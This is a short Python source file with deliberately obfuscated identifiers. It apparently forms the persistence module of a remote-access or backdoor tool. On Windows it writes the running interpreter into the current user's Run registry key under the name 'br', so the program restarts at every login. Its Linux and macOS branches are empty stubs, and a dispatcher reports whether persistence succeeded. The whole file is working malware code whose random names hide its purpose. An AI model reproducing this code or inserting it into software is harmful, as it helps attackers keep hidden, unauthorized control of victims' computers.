# -*- coding: utf-8 -*-
import sys
def RXXtmjNOuOKBZRBVIByTIUPYAInptAsZ():
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU
    VScWNotksJngYeMubrfYPXMVDAOfpGXP = r'Software\Microsoft\Windows\CurrentVersion\Run'
    BGdLwbKzzZGErPaRzHCZzHVYIopvUjCj = sys.executable
    try:
        FSIFHvYcUqoKffNKgYdFVjiDHYacPMSR = _winreg.OpenKey(HKCU, VScWNotksJngYeMubrfYPXMVDAOfpGXP, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(FSIFHvYcUqoKffNKgYdFVjiDHYacPMSR, 'br', 0, _winreg.REG_SZ, BGdLwbKzzZGErPaRzHCZzHVYIopvUjCj)
        _winreg.CloseKey(FSIFHvYcUqoKffNKgYdFVjiDHYacPMSR)
        return True, 'HKCU Run registry key applied'
    except WindowsError:
        return False, 'HKCU Run registry key failed'
def AABExAWPuLpjOQYOrdvdmKnOXfWlNMru():
    return False, 'nothing here yet'
def VEgewqtcIGtPwQolPhfImuhjiJPbfMuZ():
    return False, 'nothing here yet'
def yMwanrVcSyabPBnwbJTWfwiTHZQnTJpc(plat_type):
    if plat_type.startswith('win'):
        success, lVdgkXRRPIdnfYtrUwlMSLZSdhWjQPLz = RXXtmjNOuOKBZRBVIByTIUPYAInptAsZ()
    elif plat_type.startswith('linux'):
        success, lVdgkXRRPIdnfYtrUwlMSLZSdhWjQPLz = AABExAWPuLpjOQYOrdvdmKnOXfWlNMru()
    elif plat_type.startswith('darwin'):
        success, lVdgkXRRPIdnfYtrUwlMSLZSdhWjQPLz = VEgewqtcIGtPwQolPhfImuhjiJPbfMuZ()
    else:
        return 'Error, platform unsupported.'
    if success:
        vtVjGtMSPJDGFyiDhiJsPfepeXGtLFKX = 'Persistence successful, {}.'.format(lVdgkXRRPIdnfYtrUwlMSLZSdhWjQPLz)
    else:
        vtVjGtMSPJDGFyiDhiJsPfepeXGtLFKX = 'Persistence unsuccessful, {}.'.format(lVdgkXRRPIdnfYtrUwlMSLZSdhWjQPLz)
    return vtVjGtMSPJDGFyiDhiJsPfepeXGtLFKX
